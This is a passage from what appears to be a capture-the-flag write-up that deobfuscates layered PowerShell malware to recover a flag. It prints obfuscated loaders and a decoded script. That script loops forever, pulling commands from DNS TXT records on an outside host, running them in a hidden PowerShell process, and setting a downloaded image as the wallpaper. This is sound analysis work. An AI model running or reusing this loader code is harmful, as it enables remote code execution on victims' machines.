</span><span class="nv">${COns`UMeRf`A`S`HIOn}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"WXpBME16UmtOVGt3TWpnPQ=="</span><span class="w">
</span></code></pre></div></div>

<p>Allright, so now we know our flag is <code class="language-plaintext highlighter-rouge">objecttest + consumerfashion + uniquerebel</code> and we have the <code class="language-plaintext highlighter-rouge">consumerfashion</code> value.
Double decoded from Base64 is <code class="language-plaintext highlighter-rouge">c0434d59028</code>.</p>

<p>Next we will run <code class="language-plaintext highlighter-rouge">irm 'biglizardlover.com/gila'</code>:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$TFr1S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">" )'X'+]43[EmOHSP</span><span class="err">$</span><span class="s2">+]12[EMoHSp</span><span class="err">$</span><span class="s2"> (&amp;| )93]rAhc[]Gnirts[,)28]rAhc[+78]rAhc[+401]rAhc[((eCaLpER.)'|',)58]rAhc[+401]rAhc[+37]rAhc[((eCaLpER.)'</span><span class="err">$</span><span class="s2">',)75]rAhc[+97]rAhc[+27]rAhc[((eCaLpER.)43]rAhc[]Gnirts[,'Ywo'(eCaLpER.)')RWhRWhnIOj-RWhXRWh+]3,1[)ecnerefERPEsOBrev9OH]gniRTS'+'[( (&amp;Uh'+'I '+'Ywo ) RWh RWh RWhsFo:ElBairavRWh METI-tEs(9OH Ywo+ )}'+')RWhd2x0RWhRoXb- _9OH (]raH'+'c[{hcaEROf UhIRWhgRWhTILps- RWhURWh TIlPS-RWhcRWh ti'+'Lp'+'S-RWh-RW'+'hTilps-RWh'+'JRWhTILPS- RWhB'+'RWhTILPS-RWhwRWhtIlpS-RWh%RWhTIlpS-RW'+'h&lt;RWhTILPS- RWhoRWh TIlPS-RWh9'+'3-51B02&lt;49-601B721U521g96'+'j46O321C711W56B321%99j911B39B221O121C09g92j07-67j89C99'+'g78%87'+'U78%66&lt;701C67O52O82W46O221C51-31%61j31g'+'98&lt;49-27&lt;121B98%87B27U17j97g66U9W93%08g93%76-27&lt;37W37-86W101j31j27O56%48-98g621j09%66C37%76g86g221C0C'+'31O09U66W97-56&lt;27&lt;27g37&lt;86B56O47W9O31j1O01%37%76B67g46C46-66j011C0-01O3'+'1B98-4'+'9C'+'86g79W98j'+'76j27-46B88W47%59j801g0-31j56C56-27%96W49-59&lt;27O09%66W39&lt;31j49%49O27C87'+'j66g59&lt;521&lt;0j98O59&lt;67j98W621&lt;31-31-31B31C93B56O56B88j99%0W98%88'+'C'+'89C31C18'+'&lt;31-4-13-6U82W1'+'B37j76g27C39&lt;27W3'+'7B98j96j47W86%56-86U09U98g9U1&lt;92C1B92O13W5O66g57'+'%76%001j4'+'9U59O27O98g27C46'+'B67%59-67g521j46j27W98B'+'49W48-621g32g32C211W'+'22'+'1-811&lt;31W22-51W08-31B22%4&lt;86U7'+'6C001B76j86j221'+'W88g57%31j98B76j86O1g46W67-59B67W521B19j39&lt;56g31W47U76-86B59U98B49g1O46&lt;67W59O67C521C88%31-98j76B86C1B76j66j86B98O87-8'+'01C8'+'8O31j98B76C86B5%66W57-76&lt;001W49U5'+'9O27g98B27W46C67-59W67-521C46-27U98%49-48g621%31C56O66C66'+'j97B31U76W59B27U98j58W27O'+'31-87W86g98O67C98W49O31O87j86-56j97-88g39C31B211C4W51-77j56C56U37%3g'+'13&lt;03-5'+'9j27&lt;49-8'+'8O51U77g5-98-59W66%39g46'+'g001C56U56&lt;501g811g31O68O31j221%31g49-49O67W56B87W31W87j86-56U97W88%39C31O22-49&lt;27j87B86j19&lt;5'+'9C27B621&lt;39O66g59C27j98B76W001U3W27W46U86B98O76&lt;88%721j3W46&lt;27%98g49&lt;48U621-31O47W76W86W49&lt;88U'+'31B22U46B27&lt;98O49U'+'48-621U31C47C76g86O'+'49O88O51O31U76j6'+'6&lt;86O98g86B76U86&lt;57C27&lt;501O27B39g48&lt;12'+'1-0j31%27O39j48%121g0U3'+'7&lt;3'+'7%801B31C31B31g31&lt;93g56j56%88'+'B99g0%98C88j89g31U18-31&lt;27j88&lt;76O86j98C76j66j011&lt;48g5'+'6-9'+'8-76&lt;27O56B86%621&lt;31U76%66U86&lt;9'+'8g87g801O59U66j59&lt;59g401U0g31B37&lt;76C27'+'U39&lt;27C37-'+'98&lt;96%47%86j56W86'+'C09U98&lt;9-31'+'B27g56'+'O86j701g98-88W89&lt;0j'+'31g48C98W59-67O39C98&lt;49U67W27j57W48j58B67B56C67U47%9U31g98%49C27W88-29U27C721O97-27U221&lt;0-27U07-66C19W76U001&lt;31-31U31%31W93&lt;51C47C39B17g3O27O78U86%76&lt;47U66O87j27U59O98O86&lt;88-87W49O86%97W9-37C59-67B'+'78-86B56W2j47g46%86&lt;2&lt;46U66%87%3C59O27&lt;19B66-56g37W59W67B78O'+'86B56j47j86g97&lt;'+'2j2%32j49-39U98j98&lt;96&lt;51-31%61C31-'+'48j98&lt;59B67&lt;39j'+'98%49g67&lt;27&lt;57&lt;4'+'8j58-67U56g67j47O9W31-31-31O31g93C42g13&lt;31j46W88C46%86U58-67O69g'+'0C31B82j31O46B88'+'U46U86C76O86B69W0'+'B31g46j66%37%7'+'6C67U721j0-98W27W601W31j61O31g27B78%86j76O47g66W87W27%'+'59g98g86U88&lt;87U49'+'U86B'+'97g9C31-31-31%31W93j51-47C39W17-3W37U59C67B78g86'+'B56&lt;51g31j521j69j401%121U32&lt;19C76&lt;27'+'W9C3'+'1-96j98B67O5'+'21U0&lt;76-86U66j301-31g'+'61%31g37O76U27C39C27%37j98W96&lt;47g86&lt;56B86g09O98-9'+'B31O31&lt;31%31-93%4B4U4B4W49&lt;47C76'+'C86g59g98-621O31U48&lt;98&lt;59C2'+'7B39&lt;66j59j521j37g76&lt;67W39O58U'+'40'+'1&lt;0%31O98j87j27&lt;17-97U89g0U98j87j27C56U27O621B31&lt;18j31-98%58g98'+'-31%27g39O48%121W0C31&lt;46-66j87O3j59W27C19j66W56W37U59-67j78C86&lt;56C47C86-97j3U02W69j711-97U86g911O76U621%321-56C56%97g221O37g701U321g31U27W46W67B99-49j76%501W0-27C19C56j66W4'+'9C27B721j5O5g47C76-86g59C98U621O52-72&lt;27W49W67&lt;111%46U66'+'j59W'+'7'+'01&lt;32%32O211W98U59B27j1'+'9g76g66B011B3'+'-46j27g98B49%48C621B811C5g47W76j86B59U98&lt;621W98W27O601U3j12C701%'+'121-021U32%32j211&lt;47W76O86B37g66C87W76O401B3U98C58j27C121%3%46B27C98U'+'49&lt;48O621W811W5&lt;31B58g27W86j31&lt;61j31C'+'09W66j97O56j27B27'+'W37C86&lt;56O47B9B31B31-31U31C93g68j31%4C27%88j59&lt;98%9C5U31O27&lt;56-86U96O09RWh (]gNirTS[+ Ywo ) RWhRWh  RWhS'+'foRWh  ELBAIrav-TeS(9OHYwo'( "</span><span class="p">;</span><span class="w">  </span><span class="o">-JOIN</span><span class="w"> </span><span class="p">(</span><span class="w">  </span><span class="n">vArIABlE</span><span class="w">  </span><span class="nx">tfR1s</span><span class="w">  </span><span class="p">)</span><span class="o">.</span><span class="n">VaLUe</span><span class="p">[</span><span class="nt">-1</span><span class="o">..</span><span class="nf">-</span><span class="w"> </span><span class="p">((</span><span class="w">  </span><span class="n">vArIABlE</span><span class="w">  </span><span class="n">tfR1s</span><span class="w">  </span><span class="p">)</span><span class="o">.</span><span class="nf">VaLUe</span><span class="o">.</span><span class="nf">leNgTH</span><span class="p">)]</span><span class="o">|&amp;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">([</span><span class="n">sTriNg</span><span class="p">]</span><span class="nv">$VERboSEPrEfeREnce</span><span class="p">)[</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">'X'</span><span class="o">-joiN</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Remove <code class="language-plaintext highlighter-rouge">|&amp; ( ([sTriNg]$VERboSEPrEfeREnce)[1,3]+'X'-joiN'')</code> to keep it from executing and then run:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="s1">'owYHO9(SeT-varIABLE  hWRof'</span><span class="o">+</span><span class="s1">'ShWR  hWRhWR ) owY +[STriNg]( hWR90O69U68-65&lt;72O13U5C9%89&lt;95j88%72C4%13j86g39C13U13-13B13B9B74O65&lt;68C73W'</span><span class="o">+</span><span class="s1">'72B72j65O79j66W90'</span><span class="o">+</span><span class="s1">'C13j16&lt;13j68W72g85B13&lt;5W118W126O84&lt;94'</span><span class="o">+</span><span class="s1">'U89C72B64%3%121C72j85C89U3B104O67W78C66g73B68O67W74&lt;112j23%23U120-121'</span><span class="o">+</span><span class="s1">'%107C21j3U106O72W89W126&lt;89U95B68j67W74g5C118B126C84%94B89g72j64-'</span><span class="o">+</span><span class="s1">'3B110B66g67g9'</span><span class="o">+</span><span class="s1">'1j72B95U89W112O23%23&lt;10'</span><span class="o">+</span><span class="s1">'7'</span><span class="o">+</span><span class="s1">'W95j'</span><span class="o">+</span><span class="s1">'66U64%111&lt;76W94W72&lt;27-25O126U89C95g68-67C74g5O5j127B72C9'</span><span class="o">+</span><span class="s1">'4W66j65C91C72-0W105%67j94-99B76W64W72U13g123U107g73O122g79%65C65-123%126U67O119g68U79-117j96W20U3j79-68C74C65&lt;68C87j76-95U73W65W66j91C72W95j3O78j66-64&lt;13C0W121%84O93g72%13-'</span><span class="o">+</span><span class="s1">'89g85%89-13j81&lt;13B126O72U65C72j78j89U0g98U79-71&lt;72j78j89O13%0&lt;1'</span><span class="o">+</span><span class="s1">'04'</span><span class="o">+</span><span class="s1">'U85O93W76&lt;67g73j125j95j66&lt;93B7'</span><span class="o">+</span><span class="s1">'2C95&lt;89&lt;84U13O126-89g95g68C'</span><span class="o">+</span><span class="s1">'67C74&lt;94W4B4U4B4%39-13%13&lt;13O13B'</span><span class="o">+</span><span class="s1">'9-89O90g68B65&lt;68g74&lt;69W89j73%72C93C72U67O73g13%16'</span><span class="o">+</span><span class="s1">'g13-103j66U68-67&lt;0U12'</span><span class="o">+</span><span class="s1">'5O76B89j69-1'</span><span class="o">+</span><span class="s1">'3C9W'</span><span class="o">+</span><span class="s1">'72&lt;67C91&lt;23U121%104j96j125j13g15&lt;65B'</span><span class="o">+</span><span class="s1">'68g87B76C95U73W3-71W93C74-15j39W13%13-13-13C9g79'</span><span class="o">+</span><span class="s1">'B68U'</span><span class="o">+</span><span class="s1">'94U78&lt;88U68g89g95'</span><span class="o">+</span><span class="s1">'%72W78W66g74O67j68%87B72g13O16j13W106W72W89-0j127U76C6'</span><span class="o">+</span><span class="s1">'7%73%66j64g13B'</span><span class="o">+</span><span class="s1">'0W96B68O67C68U64U'</span><span class="o">+</span><span class="s1">'88B64O13j28B13C0'</span><span class="o">+</span><span class="s1">'g96O76-85U68%64C88W64j13&lt;31g24C39g13O13-13-13W9O74j76g65U76-85j8'</span><span class="o">+</span><span class="s1">'4&lt;75&lt;72&lt;76g94%89'</span><span class="o">+</span><span class="s1">'j93&lt;76B95&lt;89j84'</span><span class="o">+</span><span class="s1">'-13C16%13-15&lt;69&lt;89j89U93-94j23%2j2'</span><span class="o">+</span><span class="s1">'&lt;79g68j74j65B68'</span><span class="o">+</span><span class="s1">'O87B76W95W73g65-66B91&lt;72O95C3%78%66U64&lt;2&lt;68%64g74j2W65B68-87'</span><span class="o">+</span><span class="s1">'B76-95C73-9W79%68O94W78-88&lt;68O89O95U72j78O66U74&lt;67%68U87O72O3g71B93C74C15&lt;39W13%13U13-13&lt;100U67W91C66-70U72-0&lt;122U72-79O127C72U92-88W72C94%89g13U9%74U76C65B76B85j84W75j72W76U94&lt;89C93O76-95W89C84g13'</span><span class="o">+</span><span class="s1">'j0&lt;98W88-89g107j68O'</span><span class="o">+</span><span class="s1">'65g72B'</span><span class="o">+</span><span class="s1">'13-9&lt;89U90C'</span><span class="o">+</span><span class="s1">'68W65j68%74%69&lt;89'</span><span class="o">+</span><span class="s1">'-73C72&lt;93U'</span><span class="o">+</span><span class="s1">'72C67&lt;73B13g0U104g95&lt;95j66U95O108g78g8'</span><span class="o">+</span><span class="s1">'9&lt;68U66%67U13&lt;126%68B65O72&lt;67-8'</span><span class="o">+</span><span class="s1">'9-6'</span><span class="o">+</span><span class="s1">'5g84&lt;110j66j67C89j68O67&lt;88j72&lt;13-81U13g98j88C89%0g99B'</span><span class="o">+</span><span class="s1">'88%65j65g39&lt;13g13B13C13B108%7'</span><span class="o">+</span><span class="s1">'3&lt;7'</span><span class="o">+</span><span class="s1">'3U0g121%84j93O72%13j0-1'</span><span class="o">+</span><span class="s1">'21&lt;84g93B72O105&lt;72C75&lt;68U67B68g89O68&lt;6'</span><span class="o">+</span><span class="s1">'6j67U13O15O88O94'</span><span class="o">+</span><span class="s1">'O68g67C74C13U126-84'</span><span class="o">+</span><span class="s1">'U94O89&lt;72B64U22B13'</span><span class="o">+</span><span class="s1">'U88&lt;94W68W67W74O13-126U84&lt;94g89%72&lt;64W3j127%88&lt;67O89B68U64W72W3U100W67B89j72C95g66O93&lt;126B72C9'</span><span class="o">+</span><span class="s1">'5&lt;91j68B78j72&lt;94-22O13C93%88W79U65-68j78W13W78B65W76O94-94g13%122j13O86O13g118g105&lt;65U65C100g'</span><span class="o">+</span><span class="s1">'64g93%66W95-89-5g77U15O8'</span><span class="o">+</span><span class="s1">'8-94&lt;72j9'</span><span class="o">+</span><span class="s1">'5-30&lt;31'</span><span class="o">+</span><span class="s1">'g3%73U65C65j77-15W4C112B13C93g88-79j65-68j78O13O94W89C76O89g68W78-13'</span><span class="o">+</span><span class="s1">'O72W85j89U72B95W67U13B79j'</span><span class="o">+</span><span class="s1">'66C66O65C13%126g84-94%89U72-64C125-76W95-76C64W72B89g72O9'</span><span class="o">+</span><span class="s1">'5U94W100&lt;67-75W66%5B68C67B89j13O8'</span><span class="o">+</span><span class="s1">'8C10'</span><span class="o">+</span><span class="s1">'8-78O89B68j66j67B1C68B67j89-13%88C125C76O95W76&lt;64O1g94B89U95B68-67U74W13g65&lt;93j91B125W76B95-76W64g1O68j67B89j13%75g88W'</span><span class="o">+</span><span class="s1">'122j68j67B100C6'</span><span class="o">+</span><span class="s1">'7U68&lt;4%22B13-80W15-22W13&lt;118-1'</span><span class="o">+</span><span class="s1">'22'</span><span class="o">+</span><span class="s1">'W112C23g23g126-84W94'</span><span class="o">+</span><span class="s1">'B89W72j64j125g76-95%76B'</span><span class="o">+</span><span class="s1">'64C72g89O72O95U9'</span><span class="o">+</span><span class="s1">'4j100%67%'</span><span class="o">+</span><span class="s1">'75g66O5W31O29B1C29&lt;1U9g89U90U68-65%68W74j69j89B7'</span><span class="o">+</span><span class="s1">'3W72&lt;93C72g67j73B'</span><span class="o">+</span><span class="s1">'1W28U6-31-4-13&lt;'</span><span class="o">+</span><span class="s1">'81C13C98'</span><span class="o">+</span><span class="s1">'C'</span><span class="o">+</span><span class="s1">'88%89W0%99j88B65O65B39C13B13-13-13&lt;126W89j76&lt;95O89j0&lt;125&lt;95g66j'</span><span class="o">+</span><span class="s1">'78C72O94%94j13&lt;93W66%90O72&lt;95-94W69%72-65C65j13-0g108j95%74W88B64-72j67'</span><span class="o">+</span><span class="s1">'j89W97g68'</span><span class="o">+</span><span class="s1">'C9'</span><span class="o">+</span><span class="s1">'4-89B1'</span><span class="o">+</span><span class="s1">'3O10-0C110j66-64C64g76B67%73%10O1j13O9W74O65B68&lt;73g72&lt;72&lt;65-79W66U90O13'</span><span class="o">+</span><span class="s1">'C0C122g68g67%73C66%90j126g89-84%65O72j13j101W68-73W73&lt;72-67%39g80%39W9U66g79j71U72B78%89B121&lt;72-94&lt;89'</span><span class="o">+</span><span class="s1">'g13j16%13-15C122O64W28O25O76C107&lt;66%87U'</span><span class="o">+</span><span class="s1">'78%87g'</span><span class="o">+</span><span class="s1">'99C98j76-70j29g90C121O122B93B119j99%123B65W117C123O64j'</span><span class="o">+</span><span class="s1">'69g125U127B106-94&lt;20B15-3'</span><span class="o">+</span><span class="s1">'9hWR-SPlIT hWRohWR -SPLIThWR&lt;h'</span><span class="o">+</span><span class="s1">'WR-SplIThWR%hWR-SplIthWRwhWR-SPLIThWR'</span><span class="o">+</span><span class="s1">'BhWR -SPLIThWRJ'</span><span class="o">+</span><span class="s1">'hWR-spliTh'</span><span class="o">+</span><span class="s1">'WR-hWR-S'</span><span class="o">+</span><span class="s1">'pL'</span><span class="o">+</span><span class="s1">'it hWRchWR-SPlIT hWRUhWR -spLIThWRghWRIhU fOREach{[c'</span><span class="o">+</span><span class="s1">'Har]( HO9_ -bXoRhWR0x2dhWR)'</span><span class="o">+</span><span class="s1">'}) +owY HO9(sEt-ITEM hWRvariaBlE:oFshWR hWR hWR ) owY'</span><span class="o">+</span><span class="s1">' I'</span><span class="o">+</span><span class="s1">'hU&amp;( (['</span><span class="o">+</span><span class="s1">'STRing]HO9verBOsEPREference)[1,3]+hWRXhWR-jOInhWRhWR)'</span><span class="p">)</span><span class="o">.</span><span class="nf">REpLaCe</span><span class="p">(</span><span class="s1">'owY'</span><span class="p">,[</span><span class="n">strinG</span><span class="p">][</span><span class="n">chAr</span><span class="p">]</span><span class="nx">34</span><span class="p">)</span><span class="o">.</span><span class="nf">REpLaCe</span><span class="p">(([</span><span class="n">chAr</span><span class="p">]</span><span class="nx">72</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">79</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">57</span><span class="p">),</span><span class="s1">'$'</span><span class="p">)</span><span class="o">.</span><span class="nf">REpLaCe</span><span class="p">(([</span><span class="n">chAr</span><span class="p">]</span><span class="nx">73</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">104</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">85</span><span class="p">),</span><span class="s1">'|'</span><span class="p">)</span><span class="o">.</span><span class="nf">REpLaCe</span><span class="p">(([</span><span class="n">chAr</span><span class="p">]</span><span class="nx">104</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">87</span><span class="o">+</span><span class="p">[</span><span class="n">chAr</span><span class="p">]</span><span class="nx">82</span><span class="p">),[</span><span class="n">strinG</span><span class="p">][</span><span class="n">chAr</span><span class="p">]</span><span class="nx">39</span><span class="p">)</span><span class="w"> </span><span class="o">|&amp;</span><span class="p">(</span><span class="w"> </span><span class="nv">$pSHoME</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span><span class="o">+</span><span class="nv">$PSHOmE</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span><span class="o">+</span><span class="s1">'X'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>That put it back in order instead of reversed. Remove <code class="language-plaintext highlighter-rouge">|&amp;( $pSHoME[21]+$PSHOmE[34]+'X') </code> to keep it from executing and add <code class="language-plaintext highlighter-rouge">Write-Output</code> to the start:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="si">$(</span><span class="n">SeT-varIABLE</span><span class="w">  </span><span class="s1">'ofS'</span><span class="w">  </span><span class="s1">''</span><span class="w"> </span><span class="p">)</span><span class="s2"> "</span><span class="w"> </span><span class="o">+</span><span class="p">[</span><span class="n">STriNg</span><span class="p">](</span><span class="w"> </span><span class="s1">'90O69U68-65&lt;72O13U5C9%89&lt;95j88%72C4%13j86g39C13U13-13B13B9B74O65&lt;68C73W72B72j65O79j66W90C13j16&lt;13j68W72g85B13&lt;5W118W126O84&lt;94U89C72B64%3%121C72j85C89U3B104O67W78C66g73B68O67W74&lt;112j23%23U120-121%107C21j3U106O72W89W126&lt;89U95B68j67W74g5C118B126C84%94B89g72j64-3B110B66g67g91j72B95U89W112O23%23&lt;107W95j66U64%111&lt;76W94W72&lt;27-25O126U89C95g68-67C74g5O5j127B72C94W66j65C91C72-0W105%67j94-99B76W64W72U13g123U107g73O122g79%65C65-123%126U67O119g68U79-117j96W20U3j79-68C74C65&lt;68C87j76-95U73W65W66j91C72W95j3O78j66-64&lt;13C0W121%84O93g72%13-89g85%89-13j81&lt;13B126O72U65C72j78j89U0g98U79-71&lt;72j78j89O13%0&lt;104U85O93W76&lt;67g73j125j95j66&lt;93B72C95&lt;89&lt;84U13O126-89g95g68C67C74&lt;94W4B4U4B4%39-13%13&lt;13O13B9-89O90g68B65&lt;68g74&lt;69W89j73%72C93C72U67O73g13%16g13-103j66U68-67&lt;0U125O76B89j69-13C9W72&lt;67C91&lt;23U121%104j96j125j13g15&lt;65B68g87B76C95U73W3-71W93C74-15j39W13%13-13-13C9g79B68U94U78&lt;88U68g89g95%72W78W66g74O67j68%87B72g13O16j13W106W72W89-0j127U76C67%73%66j64g13B0W96B68O67C68U64U88B64O13j28B13C0g96O76-85U68%64C88W64j13&lt;31g24C39g13O13-13-13W9O74j76g65U76-85j84&lt;75&lt;72&lt;76g94%89j93&lt;76B95&lt;89j84-13C16%13-15&lt;69&lt;89j89U93-94j23%2j2&lt;79g68j74j65B68O87B76W95W73g65-66B91&lt;72O95C3%78%66U64&lt;2&lt;68%64g74j2W65B68-87B76-95C73-9W79%68O94W78-88&lt;68O89O95U72j78O66U74&lt;67%68U87O72O3g71B93C74C15&lt;39W13%13U13-13&lt;100U67W91C66-70U72-0&lt;122U72-79O127C72U92-88W72C94%89g13U9%74U76C65B76B85j84W75j72W76U94&lt;89C93O76-95W89C84g13j0&lt;98W88-89g107j68O65g72B13-9&lt;89U90C68W65j68%74%69&lt;89-73C72&lt;93U72C67&lt;73B13g0U104g95&lt;95j66U95O108g78g89&lt;68U66%67U13&lt;126%68B65O72&lt;67-89-65g84&lt;110j66j67C89j68O67&lt;88j72&lt;13-81U13g98j88C89%0g99B88%65j65g39&lt;13g13B13C13B108%73&lt;73U0g121%84j93O72%13j0-121&lt;84g93B72O105&lt;72C75&lt;68U67B68g89O68&lt;66j67U13O15O88O94O68g67C74C13U126-84U94O89&lt;72B64U22B13U88&lt;94W68W67W74O13-126U84&lt;94g89%72&lt;64W3j127%88&lt;67O89B68U64W72W3U100W67B89j72C95g66O93&lt;126B72C95&lt;91j68B78j72&lt;94-22O13C93%88W79U65-68j78W13W78B65W76O94-94g13%122j13O86O13g118g105&lt;65U65C100g64g93%66W95-89-5g77U15O88-94&lt;72j95-30&lt;31g3%73U65C65j77-15W4C112B13C93g88-79j65-68j78O13O94W89C76O89g68W78-13O72W85j89U72B95W67U13B79j66C66O65C13%126g84-94%89U72-64C125-76W95-76C64W72B89g72O95U94W100&lt;67-75W66%5B68C67B89j13O88C108-78O89B68j66j67B1C68B67j89-13%88C125C76O95W76&lt;64O1g94B89U95B68-67U74W13g65&lt;93j91B125W76B95-76W64g1O68j67B89j13%75g88W122j68j67B100C67U68&lt;4%22B13-80W15-22W13&lt;118-122W112C23g23g126-84W94B89W72j64j125g76-95%76B64C72g89O72O95U94j100%67%75g66O5W31O29B1C29&lt;1U9g89U90U68-65%68W74j69j89B73W72&lt;93C72g67j73B1W28U6-31-4-13&lt;81C13C98C88%89W0%99j88B65O65B39C13B13-13-13&lt;126W89j76&lt;95O89j0&lt;125&lt;95g66j78C72O94%94j13&lt;93W66%90O72&lt;95-94W69%72-65C65j13-0g108j95%74W88B64-72j67j89W97g68C94-89B13O10-0C110j66-64C64g76B67%73%10O1j13O9W74O65B68&lt;73g72&lt;72&lt;65-79W66U90O13C0C122g68g67%73C66%90j126g89-84%65O72j13j101W68-73W73&lt;72-67%39g80%39W9U66g79j71U72B78%89B121&lt;72-94&lt;89g13j16%13-15C122O64W28O25O76C107&lt;66%87U78%87g99C98j76-70j29g90C121O122B93B119j99%123B65W117C123O64j69g125U127B106-94&lt;20B15-39'</span><span class="o">-SPlIT</span><span class="w"> </span><span class="s1">'o'</span><span class="w"> </span><span class="o">-SPLIT</span><span class="s1">'&lt;'</span><span class="o">-SplIT</span><span class="s1">'%'</span><span class="o">-SplIt</span><span class="s1">'w'</span><span class="o">-SPLIT</span><span class="s1">'B'</span><span class="w"> </span><span class="o">-SPLIT</span><span class="s1">'J'</span><span class="o">-spliT</span><span class="s1">'-'</span><span class="o">-SpLit</span><span class="w"> </span><span class="s1">'c'</span><span class="o">-SPlIT</span><span class="w"> </span><span class="s1">'U'</span><span class="w"> </span><span class="o">-spLIT</span><span class="s1">'g'</span><span class="o">|</span><span class="w"> </span><span class="kr">fOREach</span><span class="p">{[</span><span class="n">cHar</span><span class="p">](</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="o">-bXoR</span><span class="s1">'0x2d'</span><span class="p">)})</span><span class="w"> </span><span class="o">+</span><span class="s2">" </span><span class="si">$(</span><span class="n">sEt-ITEM</span><span class="w"> </span><span class="s1">'variaBlE:oFs'</span><span class="w"> </span><span class="s1">' '</span><span class="w"> </span><span class="p">)</span><span class="s2"> "</span><span class="w"> </span><span class="o">|&amp;</span><span class="p">(</span><span class="w"> </span><span class="p">([</span><span class="n">STRing</span><span class="p">]</span><span class="nv">$verBOsEPREference</span><span class="p">)[</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">'X'</span><span class="o">-jOIn</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Again, adding <code class="language-plaintext highlighter-rouge">Write-Output</code> to the begining and removing <code class="language-plaintext highlighter-rouge">|&amp;( ([STRing]$verBOsEPREference)[1,3]+'X'-jOIn'')</code>, run that:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">STriNg</span><span class="p">]</span><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">){</span><span class="nv">$glideelbow</span><span class="o">=</span><span class="n">iex</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">((</span><span class="n">Resolve-DnsName</span><span class="w"> </span><span class="nx">VFdWbllVSnZibXM9.biglizardlover.com</span><span class="w"> </span><span class="nt">-Typetxt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Strings</span><span class="p">))))</span><span class="nv">$twilightdepend</span><span class="o">=</span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="w"> </span><span class="s2">"lizard.jpg"</span><span class="w"> 
</span><span class="nv">$biscuitrecognize</span><span class="o">=</span><span class="w"> </span><span class="n">Get-Random</span><span class="w"> </span><span class="nt">-Minimum</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-Maximum</span><span class="w"> </span><span class="nx">25</span><span class="w"> 
</span><span class="nv">$galaxyfeastparty</span><span class="o">=</span><span class="s2">"https://biglizardlover.com/img/lizard</span><span class="nv">$biscuitrecognize</span><span class="s2">.jpg"</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nv">$galaxyfeastparty</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$twilightdepend</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"usingSystem;usingSystem.Runtime.InteropServices;publicclassW{[DllImport(</span><span class="se">`"</span><span class="s2">user32.dll</span><span class="se">`"</span><span class="s2">)]publicstaticexternboolSystemParametersInfo(intuAction,intuParam,stringlpvParam,intfuWinIni);}"</span><span class="p">;[</span><span class="n">W</span><span class="p">]::</span><span class="n">SystemParametersInfo</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$twilightdepend</span><span class="p">,</span><span class="mi">1</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">|</span><span class="n">Out</span><span class="nt">-Null</span><span class="w">
</span><span class="n">Start</span><span class="nt">-Process</span><span class="w"> </span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s1">'-Command'</span><span class="p">,</span><span class="nv">$glideelbow</span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="n">Hidden</span><span class="p">}</span><span class="w">
</span><span class="nv">$objectTest</span><span class="o">=</span><span class="s2">"Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"</span><span class="w">
</span></code></pre></div></div>

<p>Now we have <code class="language-plaintext highlighter-rouge">objecttest</code> as well: <code class="language-plaintext highlighter-rouge">flag{7634269aea89</code>. Now we can pull the DNS TXT entries from <code class="language-plaintext highlighter-rouge">VFdWbllVSnZibXM9.biglizardlover.com</code>:</p>
